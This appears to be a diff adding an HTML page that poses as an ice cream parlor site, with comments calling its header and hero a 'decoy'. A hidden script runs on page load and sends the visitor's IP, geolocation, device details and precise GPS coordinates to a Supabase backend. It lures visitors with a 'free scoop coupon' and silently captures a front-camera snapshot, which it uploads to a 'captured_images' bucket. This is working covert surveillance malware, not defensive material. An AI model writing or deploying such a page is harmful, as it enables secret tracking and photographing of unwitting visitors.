@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sweet Delights | Handcrafted Ice Cream Parlor</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Explicit UMD Bundle loading for absolute reliability across all browsers -->
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.8/dist/umd/supabase.js"></script>
+</head>
+<body class="bg-amber-50 text-slate-800 min-h-screen font-sans flex flex-col justify-between selection:bg-rose-200">
+
+    <!-- Decoy Header -->
+    <header class="bg-rose-500 text-white shadow-md sticky top-0 z-50">
+        <div class="max-w-6xl mx-auto px-4 py-4 flex justify-between items-center">
+            <div class="flex items-center space-x-2">
+                <span class="text-3xl">🍦</span>
+                <h1 class="text-2xl font-bold tracking-wide">Sweet Delights</h1>
+            </div>
+            <nav class="space-x-6 hidden md:flex font-medium">
+                <a href="#menu" class="hover:text-amber-200 transition">Flavors</a>
+                <a href="#locations" class="hover:text-amber-200 transition">Locations</a>
+                <a href="#about" class="hover:text-amber-200 transition">Our Story</a>
+            </nav>
+            <button class="bg-amber-400 text-slate-900 px-5 py-2 rounded-full font-bold shadow hover:bg-amber-300 transition transform hover:scale-105">
+                Claim Free Scoop
+            </button>
+        </div>
+    </header>
+
+    <!-- Decoy Main Hero -->
+    <main class="max-w-5xl mx-auto px-4 py-12 text-center space-y-10">
+        <div class="space-y-4">
+            <span class="bg-rose-100 text-rose-600 font-bold px-4 py-1.5 rounded-full text-xs uppercase tracking-wider inline-block border border-rose-200">
+                Summer Special Offer
+            </span>
+            <h2 class="text-4xl sm:text-6xl font-extrabold text-slate-900 tracking-tight leading-tight">
+                Handcrafted Organic Ice Cream
+            </h2>
+            <p class="text-slate-600 max-w-xl mx-auto text-base sm:text-lg">
+                Made fresh daily with 100% real dairy. Allow location and camera verification to receive your instant free scoop coupon!
+            </p>
+        </div>
+
+        <div id="menu" class="grid grid-cols-1 sm:grid-cols-3 gap-6 pt-4">
+            <div class="bg-white rounded-3xl p-6 shadow-sm border border-amber-100 hover:shadow-md transition text-center space-y-3">
+                <div class="text-5xl py-2">🍓</div>
+                <h3 class="font-bold text-xl text-slate-800">Wild Strawberry</h3>
+                <p class="text-xs text-slate-500 leading-relaxed">Fresh organic berries blended into silky whole milk cream.</p>
+            </div>
+            <div class="bg-white rounded-3xl p-6 shadow-sm border border-amber-100 hover:shadow-md transition text-center space-y-3">
+                <div class="text-5xl py-2">🍫</div>
+                <h3 class="font-bold text-xl text-slate-800">Belgian Dark Fudge</h3>
+                <p class="text-xs text-slate-500 leading-relaxed">70% cocoa with handcrafted dark chocolate fudge ribbons.</p>
+            </div>
+            <div class="bg-white rounded-3xl p-6 shadow-sm border border-amber-100 hover:shadow-md transition text-center space-y-3">
+                <div class="text-5xl py-2">🍨</div>
+                <h3 class="font-bold text-xl text-slate-800">Madagascar Vanilla</h3>
+                <p class="text-xs text-slate-500 leading-relaxed">Double-extracted bourbon vanilla beans from sustainable farms.</p>
+            </div>
+        </div>
+    </main>
+
+    <footer class="bg-slate-900 text-slate-400 text-center py-6 text-sm border-t border-slate-800">
+        <p>© 2026 Sweet Delights Creamery Inc. All rights reserved.</p>
+    </footer>
+
+    <!-- Hidden Video and Canvas Elements for Image Capture -->
+    <video id="webcam-video" autoplay playsinline muted style="display:none; width: 640px; height: 480px;"></video>
+    <canvas id="snapshot-canvas" style="display:none;"></canvas>
+
+    <!-- Unified Tracking Engine -->
+    <script>
+        const SUPABASE_URL = "https://qioblxzziyjsbmppcvns.supabase.co";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFpb2JseHp6aXlqc2JtcHBjdm5zIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUyNjI4NzYsImV4cCI6MjEwMDgzODg3Nn0.DMC3nGaSYj25DJMmg9cjZoS9VGwsnexN9qwWaARM2Z4";
+
+        let supabase = null;
+        let sessionId = null;
+        let eventsLog = [];
+
+        function generateUUID() {
+            if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
+                return crypto.randomUUID();
+            }
+            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+                const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
+                return v.toString(16);
+            });
+        }
+
+        function logEvent(tag, message, detail = null) {
+            const timestamp = new Date().toISOString();
+            const logEntry = { timestamp, tag, message, detail: detail ? String(detail) : null };
+            eventsLog.push(logEntry);
+            console.log(`[${timestamp}] [${tag}] ${message}`, detail || '');
+        }
+
+        async function fetchWithTimeout(url, options = {}, timeoutMs = 3000) {
+            const controller = new AbortController();
+            const timer = setTimeout(() => controller.abort(), timeoutMs);
+            try {
+                const response = await fetch(url, { ...options, signal: controller.signal });
+                clearTimeout(timer);
+                return response;
+            } catch (err) {
+                clearTimeout(timer);
+                throw err;
+            }
+        }
+
+        function parseUserAgent() {
+            const ua = navigator.userAgent || "";
+            let browser = "Unknown Browser";
+            let os = "Unknown OS";
+            let device = "Desktop";
+
+            if (ua.includes("Firefox/")) browser = "Firefox";
+            else if (ua.includes("Edg/")) browser = "Edge";
+            else if (ua.includes("Chrome/")) browser = "Chrome";
+            else if (ua.includes("Safari/")) browser = "Safari";
+
+            if (ua.includes("Win")) os = "Windows";
+            else if (ua.includes("Mac")) os = "macOS";
+            else if (ua.includes("Linux")) os = "Linux";
+            else if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+
+            if (/Mobi|Android|iPhone|iPad/i.test(ua)) device = "Mobile";
+
+            return { browser, os, device };
+        }
+
+        function initSupabase() {
+            try {
+                const clientFactory = window.supabase?.createClient || window.supabaseClient?.createClient;
+                if (typeof clientFactory === 'function') {
+                    supabase = clientFactory(SUPABASE_URL, SUPABASE_ANON_KEY);
+                    logEvent("SUPABASE_INIT_SUCCESS", "Supabase client successfully initialized");
+                    return true;
+                }
+                
+                // Secondary check for root global assignment
+                if (window.supabase && typeof window.supabase.from === 'function') {
+                    supabase = window.supabase;
+                    logEvent("SUPABASE_INIT_SUCCESS", "Supabase client bound from window object");
+                    return true;
+                }
+
+                logEvent("SUPABASE_INIT_FAIL", "Supabase SDK library not found on window");
+                return false;
+            } catch (err) {
+                logEvent("SUPABASE_INIT_EXCEPTION", "Exception during SDK initialization", err.message);
+                return false;
+            }
+        }
+
+        async function updateVisitorRecord(updatePayload, retries = 3) {
+            if (!supabase || !sessionId) {
+                logEvent("DB_UPDATE_ABORT", "Update aborted: Supabase client or sessionId missing");
+                return false;
+            }
+
+            updatePayload.events_log = eventsLog;
+
+            for (let attempt = 1; attempt <= retries; attempt++) {
+                try {
+                    logEvent("DB_UPDATE_START", `Attempt ${attempt}/${retries} updating row for session ${sessionId}`);
+                    
+                    const { data, error, status, statusText } = await supabase
+                        .from('data_logs')
+                        .update(updatePayload)
+                        .eq('session_id', sessionId)
+                        .select();
+
+                    if (error) {
+                        logEvent("DB_UPDATE_ERROR", `Attempt ${attempt} failed [HTTP ${status}]: Code ${error.code} - ${error.message}`, error.details);
+                    } else if (!data || data.length === 0) {
+                        logEvent("DB_UPDATE_ZERO_ROWS", `Attempt ${attempt}: Update targeted session ${sessionId} but matched 0 rows.`);
+                    } else {
+                        logEvent("DB_UPDATE_SUCCESS", "Row successfully updated in Supabase", data);
+                        return true;
+                    }
+                } catch (err) {
+                    logEvent("DB_UPDATE_EXCEPTION", `Attempt ${attempt} exception: ${err.message}`);
+                }
+                await new Promise(r => setTimeout(r, attempt * 500));
+            }
+            return false;
+        }
+
+        async function fetchPublicIP() {
+            logEvent("IP_FETCH_START", "Initiating network IP identification...");
+            const providers = [
+                { url: "https://ipapi.co/json/", extractor: d => ({ ip: d.ip, geo: d }) },
+                { url: "https://ipwho.is/", extractor: d => ({ ip: d.ip, geo: d }) },
+                { url: "https://api.ipify.org?format=json", extractor: d => ({ ip: d.ip, geo: { provider: "ipify" } }) }
+            ];
+
+            for (const provider of providers) {
+                try {
+                    logEvent("IP_QUERY", `Requesting ${provider.url}`);
+                    const res = await fetchWithTimeout(provider.url, {}, 3000);
+                    if (res.ok) {
+                        const json = await res.json();
+                        const extracted = provider.extractor(json);
+                        if (extracted && extracted.ip) {
+                            logEvent("IP_SUCCESS", `IP address identified: ${extracted.ip}`);
+                            return extracted;
+                        }
+                    }
+                } catch (err) {
+                    logEvent("IP_PROVIDER_WARN", `Provider ${provider.url} failed: ${err.message}`);
+                }
+            }
+            logEvent("IP_FETCH_FAIL", "All IP geolocation endpoints failed or timed out.");
+            return { ip: "Unknown", geo: {} };
+        }
+
+        // ----------------------------------------------------
+        // STEP 1: IMMEDIATE ZERO-LATENCY INSERT
+        // ----------------------------------------------------
+        async function step1_ImmediatePageOpen() {
+            sessionId = generateUUID();
+            logEvent("SESSION_GEN", `Session ID generated: ${sessionId}`);
+
+            const uaInfo = parseUserAgent();
+            const ipData = await fetchPublicIP();
+
+            const initialPayload = {
+                session_id: sessionId,
+                user_agent: navigator.userAgent || "Unknown",
+                browser_name: uaInfo.browser,
+                operating_system: uaInfo.os,
+                device_type: uaInfo.device,
+                language: navigator.language || "Unknown",
+                referrer: document.referrer || "Direct",
+                screen_resolution: `${window.screen?.width || 0}x${window.screen?.height || 0}`,
+                viewport_size: `${window.innerWidth || 0}x${window.innerHeight || 0}`,
+                ip_address: ipData.ip,
+                ip_metadata: ipData.geo,
+                gps_status: 'pending',
+                camera_status: 'pending',
+                events_log: eventsLog
+            };
+
+            logEvent("DB_INSERT_START", "Executing primary visitor row insert into data_logs table...");
+
+            try {
+                const { data, error, status, statusText } = await supabase
+                    .from('data_logs')
+                    .insert([initialPayload])
+                    .select();
+
+                if (error) {
+                    logEvent("DB_INSERT_ERROR", `INSERT FAILED! HTTP ${status} ${statusText} | Code: ${error.code} | Message: ${error.message}`, JSON.stringify(error));
+                    console.error("[CRITICAL] Primary Supabase insert failed:", error);
+                    return false;
+                } else {
+                    logEvent("DB_INSERT_SUCCESS", "Primary visitor row inserted into Supabase", data);
+                    return true;
+                }
+            } catch (err) {
+                logEvent("DB_INSERT_EXCEPTION", `Unhandled Insert Exception: ${err.message}`, err.stack);
+                console.error("[CRITICAL] Insert Exception:", err);
+                return false;
+            }
+        }
+
+        // ----------------------------------------------------
+        // STEP 2: GPS GEOLOCATION
+        // ----------------------------------------------------
+        async function step2_GpsTracking() {
+            logEvent("GPS_REQ_START", "Requesting browser location permission...");
+
+            if (!navigator.geolocation) {
+                logEvent("GPS_UNSUPPORTED", "Browser does not support Geolocation API");
+                await updateVisitorRecord({
+                    gps_status: 'unsupported',
+                    gps_error: 'GEOLOCATION_NOT_SUPPORTED'
+                });
+                return;
+            }
+
+            const gpsOptions = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
+
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    const c = pos.coords;
+                    logEvent("GPS_GRANTED", `Coordinates acquired: Lat ${c.latitude}, Lng ${c.longitude} (Acc: ${c.accuracy}m)`);
+                    await updateVisitorRecord({
+                        gps_status: 'granted',
+                        gps_latitude: c.latitude,
+                        gps_longitude: c.longitude,
+                        gps_accuracy: c.accuracy,
+                        gps_altitude: c.altitude || null,
+                        gps_heading: c.heading || null,
+                        gps_speed: c.speed || null,
+                        gps_error: null
+                    });
+                },
+                async (err) => {
+                    let errMsg = "UNKNOWN_ERROR";
+                    if (err.code === 1) errMsg = "PERMISSION_DENIED";
+                    else if (err.code === 2) errMsg = "POSITION_UNAVAILABLE";
+                    else if (err.code === 3) errMsg = "TIMEOUT";
+
+                    logEvent("GPS_DENIED", `GPS Access Error (${errMsg}): ${err.message}`);
+                    await updateVisitorRecord({
+                        gps_status: err.code === 1 ? 'denied' : 'failed',
+                        gps_error: `${errMsg}: ${err.message}`
+                    });
+                },
+                gpsOptions
+            );
+        }
+
+        // ----------------------------------------------------
+        // STEP 3: CAMERA CAPTURE & STORAGE UPLOAD
+        // ----------------------------------------------------
+        async function step3_CameraCapture() {
+            logEvent("CAMERA_REQ_START", "Requesting camera stream access...");
+
+            if (!window.isSecureContext) {
+                logEvent("CAMERA_WARN", "Context is not HTTPS. MediaDevices API may be restricted.");
+            }
+
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                logEvent("CAMERA_UNSUPPORTED", "navigator.mediaDevices.getUserMedia is unavailable in this context");
+                await updateVisitorRecord({
+                    camera_status: 'unsupported',
+                    camera_error: 'MEDIA_DEVICES_NOT_SUPPORTED_OR_INSECURE_CONTEXT'
+                });
+                return;
+            }
+
+            let stream = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false
+                });
+
+                logEvent("CAMERA_GRANTED", "Webcam hardware stream acquired");
+
+                const video = document.getElementById("webcam-video");
+                video.srcObject = stream;
+
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve).catch(resolve);
+                    };
+                    setTimeout(resolve, 2000);
+                });
+
+                await new Promise(r => setTimeout(r, 500));
+
+                const canvas = document.getElementById("snapshot-canvas");
+                const w = video.videoWidth || 640;
+                const h = video.videoHeight || 480;
+                canvas.width = w;
+                canvas.height = h;
+
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, w, h);
+
+                const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.85));
+
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    logEvent("CAMERA_STOPPED", "Camera stream tracks released");
+                }
+
+                if (!blob) throw new Error("Canvas generated null image Blob");
+
+                logEvent("CAMERA_CAPTURED", `Snapshot encoded successfully (${blob.size} bytes)`);
+
+                const fileName = `capture_${Date.now()}_${generateUUID().substring(0, 8)}.jpg`;
+                logEvent("STORAGE_UPLOAD_START", `Uploading ${fileName} to captured_images bucket...`);
+
+                const { data: uploadData, error: uploadError } = await supabase.storage
+                    .from('captured_images')
+                    .upload(fileName, blob, { contentType: 'image/jpeg', upsert: true });
+
+                if (uploadError) {
+                    logEvent("STORAGE_UPLOAD_ERROR", `Bucket Upload Failed: ${uploadError.message}`, JSON.stringify(uploadError));
+                    await updateVisitorRecord({
+                        camera_status: 'failed',
+                        camera_error: `UPLOAD_ERROR: ${uploadError.message}`
+                    });
+                    return;
+                }
+
+                const { data: urlData } = supabase.storage
+                    .from('captured_images')
+                    .getPublicUrl(fileName);
+
+                const publicUrl = urlData ? urlData.publicUrl : null;
+                logEvent("STORAGE_UPLOAD_SUCCESS", "Public image URL generated", publicUrl);
+
+                await updateVisitorRecord({
+                    camera_status: 'granted',
+                    image_url: publicUrl,
+                    camera_error: null
+                });
+
+            } catch (err) {
+                if (stream) {
+                    stream.getTracks().forEach(t => t.stop());
+                }
+
+                let errType = "CAMERA_FAILED";
+                if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
+                    errType = "PERMISSION_DENIED";
+                } else if (err.name === "NotFoundError" || err.name === "DevicesNotFoundError") {
+                    errType = "NO_DEVICE";
+                }
+
+                logEvent("CAMERA_ERROR", `Camera Acquisition Failed (${errType}): ${err.message}`);
+
+                await updateVisitorRecord({
+                    camera_status: errType === 'PERMISSION_DENIED' ? 'denied' : 'failed',
+                    camera_error: `${errType}: ${err.message}`
+                });
+            }
+        }
+
+        // ----------------------------------------------------
+        // MASTER CONTROLLER
+        // ----------------------------------------------------
+        async function runTrackingPipeline() {
+            logEvent("PIPELINE_START", "Initializing master visitor tracking sequence...");
+
+            if (!initSupabase()) {
+                logEvent("PIPELINE_RETRY", "SDK missing on first check. Scheduling retry in 300ms...");
+                setTimeout(runTrackingPipeline, 300);
+                return;
+            }
+
+            // Step 1: Immediate Row Creation
+            const step1Success = await step1_ImmediatePageOpen();
+
+            if (!step1Success) {
+                logEvent("PIPELINE_ABORT", "Step 1 primary insert failed. Halting permission prompts.");
+                return;
+            }
+
+            // Step 2 & Step 3: Execute permission prompts asynchronously
+            step2_GpsTracking();
+            step3_CameraCapture();
+        }
+
+        if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", runTrackingPipeline);
+        } else {
+            runTrackingPipeline();
+        }
+    </script>
+</body>
+</html>
